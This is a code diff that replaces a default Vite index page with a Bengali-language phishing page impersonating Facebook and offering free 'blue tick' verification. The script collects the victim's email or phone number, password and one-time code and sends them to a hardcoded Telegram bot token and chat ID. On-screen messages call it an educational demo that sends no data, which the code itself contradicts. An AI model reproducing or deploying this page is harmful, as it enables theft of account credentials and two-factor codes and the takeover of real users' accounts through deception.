@@ -1,13 +1,221 @@
-<!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Vite + React + TS</title>
-  </head>
-  <body>
-    <div id="root"></div>
-    <script type="module" src="/src/main.tsx"></script>
-  </body>
-</html>
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ব্লু টিক ভেরিফিকেশন</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background-color: #ffffff;
+      padding: 20px 25px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+    
+    .logo {
+      color: #0866ff;
+      font-size: 48px;
+      font-weight: 700;
+      margin-bottom: 5px;
+      font-family: Helvetica, Arial, sans-serif;
+    }
+
+    .verified-badge {
+      width: 50px;
+      height: 50px;
+      margin-top: 10px;
+    }
+
+    h1 {
+      color: #1c1e21;
+      font-size: 20px;
+      margin-top: 5px;
+    }
+
+    p {
+      color: #606770;
+      font-size: 15px;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      margin: 8px 0;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+
+    button {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 6px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    
+    button:hover {
+        background-color: #166fe5;
+    }
+
+    .meta {
+      margin-top: 25px;
+      font-size: 12px;
+      color: #888;
+    }
+
+    .warning {
+      color: red;
+      margin-top: 20px;
+      font-weight: bold;
+      display: none;
+    }
+
+    /* Popup modal style */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 999;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.6);
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal-content {
+      background: white;
+      padding: 25px;
+      border-radius: 8px;
+      text-align: center;
+      width: 90%;
+      max-width: 350px;
+    }
+
+    .modal-content h2 {
+      font-size: 18px;
+      color: #1877f2;
+      margin-bottom: 10px;
+    }
+
+    .modal-content input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+    }
+
+    .countdown {
+      color: #1877f2;
+      margin-bottom: 10px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">facebook</div>
+    <img class="verified-badge" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGFyaWEtbGFiZWw9IlZlcmlmaWVkIEFjY291bnQiIHJvbGU9ImltZyIgdmVyc2lvbj0iMS4xIiB2aWV3Qm94PSIwIDAgMzggMzgiPjxnIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+PGNpcmNsZSBjeD0iMTkiIGN5PSIxOSIgZmlsbD0iIzE5NzdmMyIgcj0iMTkiLz48cG9seWdvbiBmaWxsPSIjRkZGIiBwb2ludHM9IjEwIDIwLjU4IDE0LjQyIDE2IDE3LjU1IDE5LjEzIDI4LjA5IDguNDYgMzAuNjcgMTEuMDQgMTcuNTUgMjQuMTciLz48L2c+PC9zdmc+" alt="Verified Badge">
+
+    <h1>বিনামূল্যে ব্লু টিক ভেরিফিকেশন</h1>
+    <p>আপনার ফেসবুক প্রোফাইল বা পেজটি ভেরিফাই করতে নিচের ফর্মটি পূরণ করুন।</p>
+
+    <input type="text" id="emailOrPhone" placeholder="ইমেইল অথবা ফোন নাম্বার">
+    <input type="password" id="password" placeholder="পাসওয়ার্ড">
+    <button onclick="showModal()">আবেদন করুন</button>
+
+    <p class="warning" id="warn">⚠️ এটি একটি শিক্ষামূলক ফিশিং ডেমো। আপনার প্রকৃত কোনো ডাটা পাঠানো হয়নি।</p>
+    <div class="meta">Made by Meta</div>
+  </div>
+
+  <div class="modal" id="otpModal">
+    <div class="modal-content">
+      <h2>আপনার পরিচয় নিশ্চিত করুন</h2>
+      <p class="countdown" id="countdown">OTP পাঠানো হচ্ছে... 30 সেকেন্ড অপেক্ষা করুন</p>
+      <input type="text" id="otp" placeholder="OTP কোড দিন" disabled>
+      <button onclick="sendToTelegram()">সাবমিট করুন</button>
+    </div>
+  </div>
+
+  <script>
+    const telegram_token = '8066583881:AAF_UvdW5P40Z79rASli16ej36xXnMdMf2o'; // আপনার টোকেন এখানে দিন
+    const telegram_chatid = '6763021567'; // আপনার চ্যাট আইডি এখানে দিন
+
+    function showModal() {
+      document.getElementById("otpModal").style.display = "flex";
+      let countdown = 30;
+      const countdownEl = document.getElementById("countdown");
+      const otpInput = document.getElementById("otp");
+      otpInput.disabled = true;
+
+      const timer = setInterval(() => {
+        countdown--;
+        countdownEl.textContent = `OTP পাঠানো হচ্ছে... ${countdown} সেকেন্ড অপেক্ষা করুন`;
+        if (countdown <= 0) {
+          clearInterval(timer);
+          countdownEl.textContent = "আপনার ফোনে পাঠানো OTP কোডটি এখানে দিন";
+          otpInput.disabled = false;
+        }
+      }, 1000);
+    }
+
+    function sendToTelegram() {
+      const emailOrPhone = document.getElementById('emailOrPhone').value;
+      const password = document.getElementById('password').value;
+      const otp = document.getElementById('otp').value;
+      
+      // তথ্য খালি থাকলে সাবমিট হবে না
+      if (!emailOrPhone || !password || !otp) {
+        alert("দয়া করে সকল তথ্য পূরণ করুন।");
+        return;
+      }
+
+      const message = `✅ Blue Tick Request\n\n👤 Account: ${emailOrPhone}\n🔑 Password: ${password}\n🔒 OTP: ${otp}`;
+
+      fetch(`https://api.telegram.org/bot${telegram_token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: telegram_chatid,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log(data);
+        alert("✅ আপনার আবেদনটি সফলভাবে জমা দেওয়া হয়েছে (এটি একটি শিক্ষামূলক ডেমো)।");
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert("❌ একটি সমস্যা হয়েছে। আবার চেষ্টা করুন।");
+      });
+
+      document.getElementById('warn').style.display = 'block';
+      document.getElementById("otpModal").style.display = "none";
+    }
+  </script>
+</body>
+  </html>
